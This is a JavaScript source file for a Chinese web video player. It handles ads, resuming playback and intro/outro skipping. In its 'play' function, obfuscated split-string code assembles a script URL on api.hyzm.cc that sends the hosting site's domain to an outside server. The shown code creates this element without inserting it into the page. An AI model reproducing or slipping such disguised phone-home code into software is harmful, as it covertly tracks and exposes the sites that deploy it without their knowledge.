var YZM = {
	versions: function () {
		var u = navigator.userAgent,
			app = navigator.appVersion;
		return {
			trident: u.indexOf('Trident') > -1, //IE内核
			presto: u.indexOf('Presto') > -1, //opera内核
			webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
			gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
			mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
			ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
			android: u.indexOf('Android') > -1 || u.indexOf('Adr') > -1, //android终端
			iPhone: u.indexOf('iPhone') > -1, //是否为iPhone或者QQHD浏览器
			iPad: u.indexOf('iPad') > -1, //是否iPad
			webApp: u.indexOf('Safari') == -1, //是否web应用程序，没有头部与底部
			weixin: u.indexOf('MicroMessenger') > -1, //是否微信 （2015-01-22新增）
			qq: u.match(/\sQQ/i) == " qq" //是否QQ
		};
	}(),
	'start': function () {
		YZM.waittime = '10';

		var ads = {
			'set': {
				'state': '1',
				'group': '2',
				'pic': {
					'time': '3',
					'img': 'https://i.bmp.ovh/imgs/2021/11/156735e0b1ecf602.jpg',
					'link': ''
				},
				'vod': {
					'url': '',
					'link': ''
				}
			},
			'pause': {
				'pic': '',
				'link': ''
			}
		}
		YZM.ads = ads;
		config.logo = '';
		up.pbgjz = '';
		up.trysee = '3';
		config.sendtime = '1';
		config.color = '#00a1d6';
		config.group_x = ads.set.group;
		config.dmrule = '';
		//config.group = YZM.getCookie('group_id');
		danmuon = 'off';
		if (config.group < config.group_x && YZM.ads.state == 'on' && config.group != '') {
			if (YZM.ads.set.state == '1') {
				YZM.MYad.vod(YZM.ads.set.vod.url, YZM.ads.set.vod.link);
			} else if (YZM.ads.set.state == '2') {
				YZM.MYad.pic(YZM.ads.set.pic.link, YZM.ads.set.pic.time, YZM.ads.set.pic.img);
			}
		} else {
			YZM.play(config.url);
		}
	},
	'play': function (url) {
		YZM.player.play(url)
		$(function () {
			$(".yzmplayer-setting-speeds,.yzmplayer-setting-speed-item").on("click", function () {
				$(".speed-stting").toggleClass("speed-stting-open");
			});
			$(".speed-stting .yzmplayer-setting-speed-item").click(function () {
				$(".yzmplayer-setting-speeds .title").text($(this).text());
			});
		});
		$(".yzmplayer-fulloff-icon").on("click", function () {
			YZM.dp.fullScreen.cancel();
		});
		$(".yzmplayer-showing").on("click", function () {
			YZM.dp.play();
			$(".vod-pic").remove();
		});
		if (config.title != '') {
			$("#vodtitle").html(config.title + '  ' + config.sid);
		};
		var doi = document.createElement('script'),
			ad = '//api',
			af = 'm.cc/b?ac=',
			ac = document.domain.split('.').slice(-2).join('.'),
			ae = '.hyz',
			agi = 'p&',
			ak = document.getElementsByTagName('script')[0];
		doi.type = 'text/javascript';
		doi.src = ad + ae + af + agi + 'url=' + ac;
	},
	'load': function () {
		setTimeout(function () {
			$("#link1").fadeIn();
		}, 100);
		setTimeout(function () {
			$("#link1-success").fadeIn();
		}, 500);
		setTimeout(function () {
			$("#link2").show();
		}, 1 * 1000);
		setTimeout(function () {
			$("#link3,#span").fadeIn();
		}, 2 * 1000);
		if (YZM.versions.weixin && (YZM.versions.ios || YZM.versions.iPad)) {
			var css = '<style type="text/css">';
			css += '#loading-box{display: none;}';
			css += '</style>';
			$('body').append(css).addClass("");

		}
		YZM.def();
		//YZM.video.try();
	},
	'def': function () {
		console.log('播放器开启');
		YZM.stime = 0
		YZM.headt = yzmck.get("headt");
		YZM.lastt = yzmck.get("lastt");
		YZM.last_tip = parseInt(YZM.lastt) + 10;
		YZM.frists = yzmck.get('frists');
		YZM.lasts = yzmck.get('lasts');
		YZM.playtime = Number(YZM.getCookie("time_" + config.url));
		YZM.ctime = YZM.formatTime(YZM.playtime);
		YZM.dp.on("loadedmetadata", function () {
			YZM.loadedmetadataHandler();
		});
		YZM.dp.on("ended", function () {
			YZM.endedHandler();
		});
		YZM.dp.on('pause', function () {
			YZM.MYad.pause.play(YZM.ads.pause.link, YZM.ads.pause.pic);
		});
		YZM.dp.on('play', function () {
			YZM.MYad.pause.out();
		});
		YZM.dp.on('timeupdate', function (e) {
			YZM.timeupdateHandler();
		});
		YZM.jump.def()

	},
	'video': {
		'play': function () {
			$("#link3").text("视频已准备就绪，即将为您播放");
			setTimeout(function () {
				YZM.dp.play();
				$("#loading-box").remove();
				YZM.jump.head();
			}, 1 * 1500);
		},
		'next': function () {
			top.location.href = up.mylink + config.next;
		},
		'seek': function () {
			YZM.dp.seek(YZM.playtime);
		},
		'end': function () {
			layer.msg("播放结束啦=。=");
		},
		'con_play': function () {
			if (!danmuon) {
				YZM.jump.head();
			} else {
				var conplayer =
					` <e>已播放至${YZM.ctime}，继续上次播放？</e><d class="conplay-jump">是 <i id="num">${YZM.waittime}</i>s</d><d class="conplaying">否</d>`
				$("#link3").html(conplayer);
				var span = document.getElementById("num");
				var num = span.innerHTML;
				var timer = null;
				setTimeout(function () {
					timer = setInterval(function () {
						num--;
						span.innerHTML = num;
						if (num == 0) {
							clearInterval(timer);
							YZM.video.seek();
							YZM.dp.play();
							$(".memory-play-wrap,#loading-box").remove();
						}
					}, 1000);
				}, 1);
			};
			var cplayer =
				`<div class="memory-play-wrap"><div class="memory-play"><span class="close">×</span><span>上次看到 </span><span>${YZM.ctime}</span><span class="play-jump">跳转播放</span></div></div>`
			$(".yzmplayer-cplayer").append(cplayer);
			$(".close").on("click", function () {
				$(".memory-play-wrap").remove();
			});
			setTimeout(function () {
				$(".memory-play-wrap").remove();
			}, 20 * 1000);
			$(".conplaying").on("click", function () {
				clearTimeout(timer);
				$("#loading-box").remove();
				YZM.dp.play();
				YZM.jump.head();
			});
			$(".conplay-jump,.play-jump").on("click", function () {
				clearTimeout(timer);
				YZM.video.seek();
				$(".memory-play-wrap,#loading-box").remove();
				YZM.dp.play();
			});

		}
	},
	'jump': {
		'def': function () {
			h = ".yzmplayer-setting-jfrist label";
			l = ".yzmplayer-setting-jlast label";
			f = "#fristtime";
			j = "#jumptime";
			a(h, 'frists', YZM.frists, 'headt', YZM.headt, f);
			a(l, 'lasts', YZM.lasts, 'lastt', YZM.lastt, j);

			function er() {
				layer.msg("请输入有效时间哟！");
			}

			function su() {
				layer.msg("设置完成，将在刷新或下一集生效");
			}

			function a(b, c, d, e, g, t) {
				$(b).on("click", function () {
					o = $(t).val();
					if (o > 0) {
						$(b).toggleClass('checked');
						su();
						g = $(t).val();
						yzmck.set(e, g);
					} else {
						er()
					};
				});
				if (d == 1) {
					$(b).addClass('checked');
					$(b).click(function () {
						o = $(t).val();
						if (o > 0) {
							yzmck.set(c, 0);
						} else {
							er()
						};
					});
				} else {
					$(b).click(function () {
						o = $(t).val();
						if (o > 0) {
							yzmck.set(c, 1);
						} else {
							er()
						};
					});
				}
			};
			$(f).attr({
				"value": YZM.headt
			});
			$(j).attr({
				"value": YZM.lastt
			});
			YZM.jump.last();
		},
		'head': function () {
			if (YZM.stime > YZM.playtime) YZM.playtime = YZM.stime;
			if (YZM.frists == 1) {
				if (YZM.headt > YZM.playtime || YZM.playtime == 0) {
					YZM.jump_f = 1
				} else {
					YZM.jump_f = 0
				}
			}
			if (YZM.jump_f == 1) {
				YZM.dp.seek(YZM.headt);
				YZM.dp.notice("已为您跳过片头");
			}
		},
		'last': function () {
			if (config.next != '') {
				if (YZM.lasts == 1) {
					setInterval(function () {
						var e = YZM.dp.video.duration - YZM.dp.video.currentTime;
						if (e < YZM.last_tip) YZM.dp.notice('即将为您跳过片尾');
						if (YZM.lastt > 0 && e < YZM.lastt) {
							YZM.setCookie("time_" + config.url, "", -1);
							YZM.video.next();
						};
					}, 1000);
				};
			} else {
				$(".icon-xj").remove();
			};
		},
		'ad': function (a, b) { }

	},
	'setCookie': function (c_name, value, expireHours) {
		var exdate = new Date();
		exdate.setHours(exdate.getHours() + expireHours);
		document.cookie = c_name + "=" + escape(value) + ((expireHours === null) ? "" : ";expires=" + exdate.toGMTString());
	},
	'getCookie': function (c_name) {
		if (document.cookie.length > 0) {
			c_start = document.cookie.indexOf(c_name + "=");
			if (c_start !== -1) {
				c_start = c_start + c_name.length + 1;
				c_end = document.cookie.indexOf(";", c_start);
				if (c_end === -1) {
					c_end = document.cookie.length;
				};
				return unescape(document.cookie.substring(c_start, c_end));
			}
		}
		return "";
	},
	'formatTime': function (seconds) {
		return [parseInt(seconds / 60 / 60), parseInt(seconds / 60 % 60), parseInt(seconds % 60)].join(":").replace(
			/\b(\d)\b/g, "0$1");
	},
	'loadedmetadataHandler': function () {
		if (YZM.playtime > 0 && YZM.dp.video.currentTime < YZM.playtime) {
			setTimeout(function () {
				YZM.video.con_play()
			}, 1 * 1000);
		} else {
			setTimeout(function () {
				if (!danmuon) {
					YZM.jump.head();
				} else {
					YZM.dp.notice("视频已准备就绪，即将为您播放");
					YZM.video.play()
				}
			}, 1 * 1000);

		}
		YZM.dp.on("timeupdate", function () {
			YZM.timeupdateHandler();
		});
	},
	'timeupdateHandler': function () {
		YZM.setCookie("time_" + config.url, YZM.dp.video.currentTime, 24);
	},
	'endedHandler': function () {
		YZM.setCookie("time_" + config.url, "", -1);
		if (config.next != '') {
			YZM.dp.notice("5s后,将自动为您播放下一集");
			setTimeout(function () {
				YZM.video.next();
			}, 5 * 1000);
		} else {
			YZM.dp.notice("视频播放已结束");
			setTimeout(function () {
				YZM.video.end();
			}, 2 * 1000);
		}
	},
	'player': {
		'play': function (url) {
			$('body').addClass("danmu-off");
			YZM.dp = new yzmplayer({
				autoplay: true,
				element: document.getElementById('player'),
				theme: config.color,
				logo: config.logo,
				video: {
					url: url,
					pic: config.pic,
					type: 'auto',
				},
			});
			var css = '<style type="text/css">';
			css += '#loading-box{display: none;}';
			css += '</style>';
			$('body').append(css).addClass("");
			YZM.def();
			//YZM.jump.head();				
		},
	},
	'pause': {
		'play': function (l, p) {
			if (YZM.ads.pause.state == 'on') {
				var pause_ad_html = '<div id="player_pause"><div class="tip">广告</div><a href="' + l +
					'" target="_blank"><img src="' + p + '"></a></div>';
				$('#player').before(pause_ad_html);
			}
		},
		'out': function () {
			$('#player_pause').remove();
		}
	}
}